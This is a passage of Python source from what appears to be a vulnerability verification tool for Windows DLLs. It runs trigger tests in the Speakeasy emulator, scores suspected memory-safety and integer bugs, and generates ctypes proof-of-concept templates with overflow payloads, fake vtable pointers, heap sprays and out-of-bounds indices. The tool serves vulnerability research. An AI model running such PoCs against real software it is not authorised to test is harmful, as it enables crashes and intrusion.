                ptr = self.se.mem_alloc(0x100)
                if ptr:
                    self.se.mem_write(ptr, b'\x41' * 0x100)
                    spray_ptrs.append(ptr)

            # Free all to leave pattern in freed memory
            for ptr in spray_ptrs:
                pass  # Speakeasy may not support direct free

            # Call function which may use uninitialized memory
            print("  [*] Calling function...")
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [])
            except Exception as e:
                print(f"    Exception: {e}")

            event = VulnEvent(
                vuln_type='UNINITIALIZED_MEMORY',
                address=func_addr,
                details="Tested with heap spray pattern",
                confidence=0.50
            )
            self.vuln_events.append(event)
            print("\n  [*] UNINITIALIZED_MEMORY test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_type_confusion(self, func_addr: int, func_name: str):
        """Trigger Type Confusion vulnerability"""
        print("\n[Test] Type Confusion trigger test")
        print("-" * 40)

        # Test with different type interpretations
        test_values = [
            (0x41414141, "Integer as pointer"),
            (0, "NULL"),
            (1, "Invalid low address"),
        ]

        try:
            for val, desc in test_values:
                print(f"  [*] Testing: {desc} (0x{val:x})")
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [val])
                except Exception as e:
                    event = VulnEvent(
                        vuln_type='TYPE_CONFUSION',
                        address=func_addr,
                        details=f"Exception with {desc}: {e}",
                        confidence=0.70
                    )
                    self.vuln_events.append(event)

            if any(e.vuln_type == 'TYPE_CONFUSION' for e in self.vuln_events):
                print("\n  [!!!] TYPE CONFUSION DETECTED!")
            else:
                event = VulnEvent(
                    vuln_type='TYPE_CONFUSION',
                    address=func_addr,
                    details="Tested with type confusion values",
                    confidence=0.50
                )
                self.vuln_events.append(event)
                print("\n  [*] TYPE_CONFUSION test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_control_flow_hijack(self, func_addr: int, func_name: str):
        """Trigger Control Flow Hijack"""
        print("\n[Test] Control Flow Hijack trigger test")
        print("-" * 40)

        try:
            # Create payload with fake function pointer
            payload = b'A' * 64 + struct.pack('<Q', 0x4141414141414141)
            payload_buf = self.se.mem_alloc(len(payload) + 16)
            self.se.mem_write(payload_buf, payload)

            print(f"  [*] Payload with fake call target: 0x4141414141414141")
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [payload_buf])
            except Exception as e:
                event = VulnEvent(
                    vuln_type='CONTROL_FLOW_HIJACK',
                    address=func_addr,
                    details=f"Exception (possible hijack): {e}",
                    confidence=0.80
                )
                self.vuln_events.append(event)
                print(f"\n  [!!!] CONTROL FLOW HIJACK DETECTED!")
                return

            event = VulnEvent(
                vuln_type='CONTROL_FLOW_HIJACK',
                address=func_addr,
                details="Tested with fake function pointer",
                confidence=0.55
            )
            self.vuln_events.append(event)
            print("\n  [*] CONTROL_FLOW_HIJACK test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_integer_underflow(self, func_addr: int, func_name: str):
        """Trigger Integer Underflow"""
        print("\n[Test] Integer Underflow trigger test")
        print("-" * 40)

        test_values = [
            (0, "Zero"),
            (-1, "Negative one"),
            (-0x80000000, "INT32_MIN"),
        ]

        try:
            for val, desc in test_values:
                print(f"  [*] Testing: {val} ({desc})")
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [val & 0xFFFFFFFF])
                except Exception as e:
                    event = VulnEvent(
                        vuln_type='INTEGER_UNDERFLOW',
                        address=func_addr,
                        details=f"Exception with {desc}: {e}",
                        confidence=0.75
                    )
                    self.vuln_events.append(event)

            if any(e.vuln_type == 'INTEGER_UNDERFLOW' for e in self.vuln_events):
                print("\n  [!!!] INTEGER UNDERFLOW DETECTED!")
            else:
                event = VulnEvent(
                    vuln_type='INTEGER_UNDERFLOW',
                    address=func_addr,
                    details="Tested with underflow values",
                    confidence=0.55
                )
                self.vuln_events.append(event)
                print("\n  [*] INTEGER_UNDERFLOW test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_info_disclosure(self, func_addr: int, func_name: str):
        """Trigger Information Disclosure"""
        print("\n[Test] Information Disclosure trigger test")
        print("-" * 40)

        try:
            # Allocate output buffer
            out_buf = self.se.mem_alloc(0x1000)
            print(f"  [*] Output buffer: 0x{out_buf:x}")

            # Call function with output buffer
            try:
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, [out_buf, 0x1000])
            except Exception as e:
                print(f"    Exception: {e}")

            # Check if buffer was filled with data
            try:
                data = self.se.mem_read(out_buf, 64)
                if data and data != b'\x00' * 64:
                    event = VulnEvent(
                        vuln_type='INFO_DISCLOSURE',
                        address=func_addr,
                        details=f"Function returned data: {data[:16].hex()}...",
                        confidence=0.65
                    )
                    self.vuln_events.append(event)
                    print("\n  [!!!] INFO DISCLOSURE DETECTED!")
                    return
            except Exception:
                pass

            event = VulnEvent(
                vuln_type='INFO_DISCLOSURE',
                address=func_addr,
                details="Tested with output buffer",
                confidence=0.45
            )
            self.vuln_events.append(event)
            print("\n  [*] INFO_DISCLOSURE test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_memory_leak(self, func_addr: int, func_name: str):
        """Trigger Memory Leak detection"""
        print("\n[Test] Memory Leak trigger test")
        print("-" * 40)

        try:
            initial_allocs = len([b for b in self.memory_blocks.values()
                                  if b.state == MemState.ALLOCATED])

            # Call function multiple times
            print("  [*] Calling function 10 times...")
            for i in range(10):
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, [])
                except Exception:
                    pass

            final_allocs = len([b for b in self.memory_blocks.values()
                               if b.state == MemState.ALLOCATED])

            leaked = final_allocs - initial_allocs
            if leaked > 0:
                event = VulnEvent(
                    vuln_type='MEMORY_LEAK',
                    address=func_addr,
                    details=f"Detected {leaked} unreleased allocations",
                    confidence=0.70
                )
                self.vuln_events.append(event)
                print(f"\n  [!!!] MEMORY LEAK DETECTED ({leaked} allocations)")
            else:
                event = VulnEvent(
                    vuln_type='MEMORY_LEAK',
                    address=func_addr,
                    details="No obvious leak detected",
                    confidence=0.40
                )
                self.vuln_events.append(event)
                print("\n  [*] MEMORY_LEAK test completed")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _trigger_generic(self, func_addr: int, func_name: str, vuln_type: str):
        """Generic trigger for complex vulnerability types"""
        print(f"\n[Test] {vuln_type} trigger test (generic)")
        print("-" * 40)

        try:
            # Try calling with various parameter patterns
            patterns = [
                [],
                [0],
                [self.se.mem_alloc(0x100)],
                [self.se.mem_alloc(0x100), 0x100],
            ]

            for i, params in enumerate(patterns):
                print(f"  [*] Pattern {i+1}: {len(params)} args")
                try:
                    self.current_ip = func_addr
                    with suppress_stderr():
                        self.se.call(func_addr, params)
                except Exception as e:
                    print(f"    Exception: {e}")

            event = VulnEvent(
                vuln_type=vuln_type,
                address=func_addr,
                details=f"Generic test for {vuln_type}",
                confidence=0.40
            )
            self.vuln_events.append(event)
            print(f"\n  [*] {vuln_type} test completed (limited support)")

        except Exception as e:
            print(f"  [!] Test failed: {e}")

    def _try_smart_call(self, func_addr: int, func_name: str = ""):
        """Try calling function with smart parameter guessing"""
        # Common parameter patterns for different function types
        param_patterns = [
            # Pattern 1: Single pointer argument
            lambda se: [se.mem_alloc(0x100)],
            # Pattern 2: Buffer + size
            lambda se: [se.mem_alloc(0x100), 0x100],
            # Pattern 3: Dest + src + size
            lambda se: [se.mem_alloc(0x100), se.mem_alloc(0x100), 0x100],
            # Pattern 4: Handle + buffer + size
            lambda se: [0, se.mem_alloc(0x100), 0x100],
            # Pattern 5: Zero args
            lambda se: [],
        ]

        for i, get_params in enumerate(param_patterns):
            try:
                params = get_params(self.se)
                self.current_ip = func_addr
                with suppress_stderr():
                    self.se.call(func_addr, params)
                print(f"  [+] Pattern {i+1} succeeded")
                return True
            except Exception as e:
                continue

        return False

    def verify(self, target_addr: int, vuln_type: str,
               func_name: str = "", timeout: int = 60,
               trigger: bool = False) -> VerifyResult:
        """
        Verify vulnerability at target address

        Args:
            target_addr: Address to verify
            vuln_type: Vulnerability type. All 21 types supported:
                Memory: BUFFER_OVERFLOW, HEAP_OVERFLOW, DOUBLE_FREE, USE_AFTER_FREE,
                        NULL_DEREFERENCE, OUT_OF_BOUNDS_READ, OUT_OF_BOUNDS_WRITE,
                        UNINITIALIZED_MEMORY, TYPE_CONFUSION, CONTROL_FLOW_HIJACK
                Integer: INTEGER_OVERFLOW, INTEGER_UNDERFLOW
                Injection: FORMAT_STRING, COMMAND_INJECTION, PATH_TRAVERSAL
                Info: INFO_DISCLOSURE, MEMORY_LEAK
                Complex: RACE_CONDITION, STACK_EXHAUSTION, DESERIALIZATION, PRIVILEGE_ESCALATION
            func_name: Function name (optional)
            timeout: Emulation timeout in seconds
            trigger: If True, generate test cases to trigger the vulnerability

        Returns:
            VerifyResult with verification details
        """
        self._reset_state()

        result = VerifyResult(
            target_addr=target_addr,
            vuln_type=vuln_type,
            verified=False,
            confidence=0.0
        )

        try:
            # Setup emulator
            self.se = self._setup_emulator()

            # Find function containing target address
            entry_point = self._find_entry_point(target_addr, func_name)

            if trigger:
                # Generate and run trigger test cases
                print(f"[*] Generating trigger tests for {vuln_type}...")
                try:
                    run_with_timeout(
                        self._run_trigger_tests,
                        self.timeout,
                        vuln_type, target_addr, func_name
                    )
                except EmulationTimeout:
                    print(f"[!] Trigger tests exceeded {self.timeout}s timeout")
            elif entry_point:
                print(f"[*] Emulating from 0x{entry_point:x} (timeout: {self.timeout}s)...")

                # Run emulation with timeout
                try:
                    run_with_timeout(
                        lambda: self.se.run_module(self.module, all_entrypoints=False),
                        self.timeout
                    )
                except EmulationTimeout:
                    print(f"[!] Emulation exceeded {self.timeout}s timeout")
                except Exception as e:
                    # Emulation may stop due to unhandled API, etc.
                    pass

                # Try calling the specific export with smart parameters (with timeout)
                if func_name and func_name in self.exports:
                    export_addr = self.exports[func_name]
                    print(f"[*] Trying smart call to {func_name} @ 0x{export_addr:x}...")
                    try:
                        run_with_timeout(
                            self._try_smart_call,
                            self.timeout,
                            export_addr, func_name
                        )
                    except EmulationTimeout:
                        print(f"[!] Smart call exceeded {self.timeout}s timeout")
                elif entry_point:
                    # Try calling entry point with smart parameters
                    print(f"[*] Trying smart call to 0x{entry_point:x}...")
                    try:
                        run_with_timeout(
                            self._try_smart_call,
                            self.timeout,
                            entry_point
                        )
                    except EmulationTimeout:
                        print(f"[!] Smart call exceeded {self.timeout}s timeout")

            # Analyze results
            result.events = self.vuln_events
            result.api_calls = self.api_calls

            # Check if we found the target vulnerability type
            for event in self.vuln_events:
                if event.vuln_type == vuln_type:
                    result.verified = True
                    result.confidence = max(result.confidence, event.confidence)

            # If not directly verified, check patterns
            if not result.verified:
                result.confidence = self._analyze_patterns(vuln_type)
                # 使用配置的阈值
                verify_threshold = 0.6
                if default_config:
                    verify_threshold = default_config.verify_confidence.verify_threshold
                result.verified = result.confidence >= verify_threshold

            # Generate analysis report
            result.analysis = self._generate_report(result)

        except Exception as e:
            result.analysis = f"Emulation failed: {e}"

        return result

    def _find_entry_point(self, target_addr: int, func_name: str = "") -> Optional[int]:
        """Find entry point for emulation"""
        # If we have a function name, use its address
        if func_name and func_name in self.exports:
            return self.exports[func_name]

        # Find export containing target address
        for name, addr in self.exports.items():
            # Assume function is within 0x1000 bytes
            if addr <= target_addr < addr + 0x1000:
                return addr

        # Fall back to first export
        if self.exports:
            return list(self.exports.values())[0]

        return None

    def _analyze_patterns(self, vuln_type: str) -> float:
        """Analyze API call patterns for vulnerability indicators"""
        confidence = 0.0

        if vuln_type == 'DOUBLE_FREE':
            # Check for multiple frees
            free_calls = [c for c in self.api_calls if c['type'] == 'free']
            if len(free_calls) >= 2:
                confidence += 0.4
                # Check for same address freed twice
                freed_addrs = [c['address'] for c in free_calls]
                if len(freed_addrs) != len(set(freed_addrs)):
                    confidence += 0.4

        elif vuln_type == 'USE_AFTER_FREE':
            # Check for free followed by access
            has_free = any(c['type'] == 'free' for c in self.api_calls)

            if has_free:
                confidence += 0.3
                # Check copy/access after free
                free_idx = next((i for i, c in enumerate(self.api_calls) if c['type'] == 'free'), -1)
                if free_idx >= 0:
                    for c in self.api_calls[free_idx+1:]:
                        if c['type'] in ('copy', 'access'):
                            confidence += 0.3
                            break

        elif vuln_type in ('BUFFER_OVERFLOW', 'HEAP_OVERFLOW'):
            # Check for copy operations
            copy_calls = [c for c in self.api_calls if c['type'] == 'copy']
            if copy_calls:
                confidence += 0.3
                # Check if any copy is large
                for c in copy_calls:
                    if c.get('size', 0) > 256:
                        confidence += 0.2
                        break

        elif vuln_type == 'INTEGER_OVERFLOW':
            # Check for arithmetic operations followed by allocation/copy
            alloc_calls = [c for c in self.api_calls if c['type'] == 'alloc']
            if alloc_calls:
                confidence += 0.3
                # Check for suspiciously small allocations that might be overflow result
                for c in alloc_calls:
                    if 0 < c.get('size', 0) < 16:
                        confidence += 0.3
                        break

        elif vuln_type == 'FORMAT_STRING':
            # Check for format function calls
            format_calls = [c for c in self.api_calls if c['type'] == 'format']
            if format_calls:
                confidence += 0.5

        elif vuln_type == 'COMMAND_INJECTION':
            # Check for command execution calls
            cmd_calls = [c for c in self.api_calls if c['type'] == 'command']
            if cmd_calls:
                confidence += 0.6

        elif vuln_type == 'PATH_TRAVERSAL':
            # Check for file operations
            file_calls = [c for c in self.api_calls if c['type'] == 'file']
            if file_calls:
                confidence += 0.4

        elif vuln_type == 'NULL_DEREFERENCE':
            # Hard to detect via patterns - mostly relies on crash
            confidence += 0.2

        elif vuln_type in ('OUT_OF_BOUNDS_READ', 'OUT_OF_BOUNDS_WRITE'):
            # Check for copy with large size or array access patterns
            copy_calls = [c for c in self.api_calls if c['type'] == 'copy']
            if copy_calls:
                confidence += 0.3

        elif vuln_type == 'INTEGER_UNDERFLOW':
            # Similar to overflow detection
            alloc_calls = [c for c in self.api_calls if c['type'] == 'alloc']
            if alloc_calls:
                confidence += 0.25

        elif vuln_type == 'UNINITIALIZED_MEMORY':
            # Check for allocations without initialization
            alloc_calls = [c for c in self.api_calls if c['type'] == 'alloc']
            copy_calls = [c for c in self.api_calls if c['type'] == 'copy']
            if alloc_calls and not copy_calls:
                confidence += 0.3

        elif vuln_type == 'TYPE_CONFUSION':
            # Hard to detect statically
            confidence += 0.2

        elif vuln_type == 'CONTROL_FLOW_HIJACK':
            # Check for indirect calls after buffer operations
            copy_calls = [c for c in self.api_calls if c['type'] == 'copy']
            if copy_calls:
                confidence += 0.3

        elif vuln_type == 'INFO_DISCLOSURE':
            # Check for copy/read operations
            copy_calls = [c for c in self.api_calls if c['type'] == 'copy']
            if copy_calls:
                confidence += 0.25

        elif vuln_type == 'MEMORY_LEAK':
            # Check for allocs without frees
            alloc_count = sum(1 for c in self.api_calls if c['type'] == 'alloc')
            free_count = sum(1 for c in self.api_calls if c['type'] == 'free')
            if alloc_count > free_count:
                confidence += 0.4

        elif vuln_type in ('RACE_CONDITION', 'STACK_EXHAUSTION', 'DESERIALIZATION', 'PRIVILEGE_ESCALATION'):
            # Complex types - limited pattern support
            confidence += 0.15

        return min(confidence, 1.0)

    def _generate_report(self, result: VerifyResult) -> str:
        """Generate analysis report"""
        lines = []
        lines.append("=" * 60)
        lines.append(" Speakeasy Vulnerability Verification Report")
        lines.append("=" * 60)

        lines.append(f"\nTarget: 0x{result.target_addr:x}")
        lines.append(f"Type: {result.vuln_type}")
        lines.append(f"Verified: {'YES' if result.verified else 'NO'}")
        lines.append(f"Confidence: {result.confidence:.0%}")

        # Vulnerability events
        if result.events:
            lines.append(f"\n--- Detected Events ({len(result.events)}) ---")
            for i, event in enumerate(result.events, 1):
                lines.append(f"\n[{i}] {event.vuln_type}")
                lines.append(f"    Address: 0x{event.address:x}")
                if event.func_name:
                    lines.append(f"    Function: {event.func_name}")
                lines.append(f"    Memory: 0x{event.memory_addr:x}")
                lines.append(f"    Confidence: {event.confidence:.0%}")

                # Show reproduction steps
                if hasattr(event, 'trigger_sequence') and event.trigger_sequence:
                    lines.append(f"\n    Reproduction Steps:")
                    for step in event.trigger_sequence:
                        lines.append(f"      {step}")

        # API calls summary
        if result.api_calls:
            lines.append(f"\n--- API Calls ({len(result.api_calls)}) ---")
            alloc_count = sum(1 for c in result.api_calls if c['type'] == 'alloc')
            free_count = sum(1 for c in result.api_calls if c['type'] == 'free')
            copy_count = sum(1 for c in result.api_calls if c['type'] == 'copy')

            lines.append(f"  Allocations: {alloc_count}")
            lines.append(f"  Frees: {free_count}")
            lines.append(f"  Copies: {copy_count}")

            # Show last few calls
            lines.append("\n  Recent calls:")
            for call in result.api_calls[-5:]:
                if call['type'] == 'alloc':
                    lines.append(f"    ALLOC 0x{call['address']:x} ({call['size']} bytes) via {call['api']}")
                elif call['type'] == 'free':
                    lines.append(f"    FREE  0x{call['address']:x} via {call['api']}")
                elif call['type'] == 'copy':
                    lines.append(f"    COPY  {call['size']} bytes to 0x{call['dest']:x} via {call['api']}")

        # Memory state
        if self.memory_blocks:
            lines.append(f"\n--- Memory Blocks ({len(self.memory_blocks)}) ---")
            for addr, block in list(self.memory_blocks.items())[:5]:
                state = "FREED" if block.state == MemState.FREED else "ALLOCATED"
                lines.append(f"  0x{addr:x}: {block.size} bytes [{state}]")

        # Generate PoC code
        if result.verified and result.events:
            lines.append(f"\n--- PoC Code (Python) ---")
            poc = self._generate_poc(result)
            for line in poc.split("\n"):
                lines.append(f"  {line}")

        return "\n".join(lines)

    def _generate_poc(self, result: VerifyResult) -> str:
        """Generate PoC code for the vulnerability"""
        if not result.events:
            return "# No vulnerability detected"

        event = result.events[0]
        dll_name = self.binary_path.name
        func_name = event.func_name or f"sub_{event.address:x}"

        if event.vuln_type == 'DOUBLE_FREE':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-415: Double Free
"""
import ctypes
from ctypes import wintypes

# Load the vulnerable DLL
dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Option 1: Get function by name (if exported)
# func = dll.{func_name}

# Option 2: Get function by address offset
# base = dll._handle
# func_ptr = base + 0x{event.address - self.image_base:x}
# func = ctypes.CFUNCTYPE(None, ctypes.c_void_p)(func_ptr)

# Trigger sequence:
buf = ctypes.create_string_buffer(0x100)
ptr = ctypes.cast(buf, ctypes.c_void_p).value

# First call - frees the memory
# func(ptr)

# Second call - double-free!
# func(ptr)

print("Manually verify with debugger attached")
'''

        elif event.vuln_type == 'USE_AFTER_FREE':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target: 0x{event.address:x}
CWE-416: Use After Free
"""
import ctypes

dll = ctypes.WinDLL(r"{self.binary_path}")

# 1. Allocate buffer
buf = ctypes.create_string_buffer(0x100)
ptr = ctypes.cast(buf, ctypes.c_void_p).value

# 2. Free the buffer (through some API)
# free_func(ptr)

# 3. Use the freed pointer - UAF!
# vuln_func(ptr)
'''

        elif event.vuln_type == 'BUFFER_OVERFLOW':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target: 0x{event.address:x}
CWE-120: Buffer Overflow
"""
import ctypes

dll = ctypes.WinDLL(r"{self.binary_path}")

# Small destination buffer
dest = ctypes.create_string_buffer(32)

# Large source data
payload = b"A" * 256

# Overflow!
# vuln_func(dest, payload, len(payload))
'''

        elif event.vuln_type == 'CONTROL_FLOW_HIJACK':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-114: Control Flow Hijack via Indirect Call
"""
import ctypes
import struct

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    # Set up function prototype - adjust based on actual signature
    func.argtypes = [ctypes.c_void_p]
    func.restype = ctypes.c_int

    # Payload to overwrite function pointer / vtable
    # Pattern: padding + fake call target
    padding = b"A" * 64
    fake_target = struct.pack('<Q', 0x4141414141414141)  # x64
    payload = padding + fake_target

    buf = ctypes.create_string_buffer(payload)

    print(f"[*] Triggering control flow hijack at {func_name}")
    print(f"[*] Payload: {{len(payload)}} bytes")

    try:
        result = func(buf)
        print(f"[*] Function returned: {{result}}")
    except Exception as e:
        print(f"[!] Exception (may indicate hijack): {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to set breakpoint at 0x{event.address:x}")
'''

        elif event.vuln_type in ('UNINITIALIZED_MEMORY', 'UNINIT_USE'):
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-908: Use of Uninitialized Resource
"""
import ctypes
from ctypes import wintypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    # Heap spray to create predictable uninitialized memory
    msvcrt = ctypes.CDLL("msvcrt")
    malloc = msvcrt.malloc
    malloc.restype = ctypes.c_void_p
    free = msvcrt.free
    free.argtypes = [ctypes.c_void_p]

    print("[*] Spraying heap with marker patterns...")
    allocated = []
    for i in range(100):
        ptr = malloc(1024)
        if ptr:
            pattern = 0x41 + (i % 26)
            ctypes.memset(ptr, pattern, 1024)
            allocated.append(ptr)

    # Free some to create uninitialized regions
    for i, ptr in enumerate(allocated):
        if i % 3 == 0:
            free(ptr)
            allocated[i] = None

    print(f"[*] Calling {func_name} to trigger uninitialized memory usage...")

    try:
        # Adjust arguments based on actual function signature
        result = func()
        print(f"[*] Function returned: {{result}}")
    except Exception as e:
        print(f"[!] Exception: {{e}}")

    # Cleanup
    for ptr in allocated:
        if ptr:
            free(ptr)
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'UNTRUSTED_POINTER_DEREFERENCE':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{{event.address:x}}
CWE-822: Untrusted Pointer Dereference
"""
import ctypes
import struct

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    msvcrt = ctypes.CDLL("msvcrt")
    malloc = msvcrt.malloc
    malloc.restype = ctypes.c_void_p
    malloc.argtypes = [ctypes.c_size_t]
    free = msvcrt.free
    free.argtypes = [ctypes.c_void_p]

    # Test with controlled pointer values
    test_ptrs = [
        0x0,                      # NULL
        0x41414141,               # Low address
        0x4141414141414141,       # 64-bit pattern
        0xFFFFFFFFFFFFFFFF,       # -1
    ]

    print("[*] Testing untrusted pointer dereference...")

    for ptr_val in test_ptrs:
        print(f"[*] Testing pointer value: 0x{{ptr_val:x}}")

        # Create buffer with controlled pointer
        buf = malloc(256)
        if buf:
            # Write controlled pointer to buffer
            ptr_bytes = struct.pack('<Q', ptr_val)
            ctypes.memmove(buf, ptr_bytes, len(ptr_bytes))

            try:
                result = func(buf)
                print(f"    [+] Returned: {{result}}")
            except OSError as e:
                print(f"    [!] Crash: {{e}}")
                print(f"    [+] Vulnerability confirmed!")
            except Exception as e:
                print(f"    [*] Exception: {{e}}")
            finally:
                free(ctypes.c_void_p(buf))

    print("[*] Test completed")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{{event.address:x}}")
'''

        elif event.vuln_type == 'HEAP_OVERFLOW':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-122: Heap-based Buffer Overflow
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    # Allocate heap buffer
    msvcrt = ctypes.CDLL("msvcrt")
    malloc = msvcrt.malloc
    malloc.restype = ctypes.c_void_p
    free = msvcrt.free
    free.argtypes = [ctypes.c_void_p]

    # Small heap allocation
    heap_buf = malloc(32)
    print(f"[*] Heap buffer allocated: 0x{{heap_buf:x}}")

    # Oversized payload to overflow heap buffer
    payload = b"A" * 64 + b"B" * 64  # 128 bytes into 32-byte buffer

    print(f"[*] Triggering heap overflow with {{len(payload)}} bytes...")
    try:
        # Adjust arguments based on actual function signature
        func(heap_buf, payload, len(payload))
    except Exception as e:
        print(f"[!] Exception: {{e}}")

    free(heap_buf)
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'NULL_DEREFERENCE':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-476: NULL Pointer Dereference
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p]
    func.restype = ctypes.c_int

    print("[*] Calling function with NULL pointer...")
    try:
        result = func(None)
        print(f"[*] Function returned: {{result}}")
    except Exception as e:
        print(f"[!] Exception (NULL dereference): {{e}}")

    # Also test with low addresses
    for addr in [0, 1, 0x10, 0x100]:
        print(f"[*] Testing with address 0x{{addr:x}}...")
        try:
            result = func(ctypes.c_void_p(addr))
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'OUT_OF_BOUNDS_READ':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-125: Out-of-bounds Read
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p, ctypes.c_int]
    func.restype = ctypes.c_int

    # Allocate small buffer
    buf = ctypes.create_string_buffer(16)

    # Test with out-of-bounds indices
    oob_indices = [-1, 100, 0x7FFFFFFF, 0xFFFFFFFF]

    for idx in oob_indices:
        print(f"[*] Testing with index {{idx}} (0x{{idx & 0xFFFFFFFF:x}})...")
        try:
            result = func(buf, idx)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception (OOB read): {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'OUT_OF_BOUNDS_WRITE':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-787: Out-of-bounds Write
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
    func.restype = ctypes.c_int

    # Allocate small buffer
    buf = ctypes.create_string_buffer(16)

    # Test with out-of-bounds indices
    oob_indices = [-1, 100, 0x7FFFFFFF]

    for idx in oob_indices:
        print(f"[*] Testing write at index {{idx}}...")
        try:
            result = func(buf, idx, 0x41)  # Write 'A' at OOB index
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception (OOB write): {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'TYPE_CONFUSION':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-843: Type Confusion
"""
import ctypes
import struct

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p]
    func.restype = ctypes.c_int

    # Create fake object with wrong type marker
    # Simulate object with vtable pointer manipulation
    fake_obj = ctypes.create_string_buffer(128)

    # Set up fake vtable pointer
    fake_vtable = 0x4141414141414141  # x64
    struct.pack_into('<Q', fake_obj, 0, fake_vtable)

    # Additional type fields
    struct.pack_into('<I', fake_obj, 8, 0xDEADBEEF)  # Fake type ID

    print("[*] Created fake object with manipulated type info")
    print(f"    Fake vtable: 0x{{fake_vtable:x}}")

    try:
        result = func(fake_obj)
        print(f"[*] Function returned: {{result}}")
    except Exception as e:
        print(f"[!] Exception (type confusion): {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'INTEGER_OVERFLOW':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-190: Integer Overflow
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_uint32]
    func.restype = ctypes.c_int

    # Integer overflow test values
    test_values = [
        (0x7FFFFFFF, "INT32_MAX"),
        (0x80000000, "INT32_MIN as unsigned"),
        (0xFFFFFFFF, "UINT32_MAX"),
        (0x7FFFFFFF + 1, "INT32_MAX + 1"),
        (0xFFFFFFFE + 2, "Wrap around"),
    ]

    for val, desc in test_values:
        print(f"[*] Testing with {{desc}}: 0x{{val & 0xFFFFFFFF:x}}")
        try:
            result = func(val & 0xFFFFFFFF)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'INTEGER_UNDERFLOW':
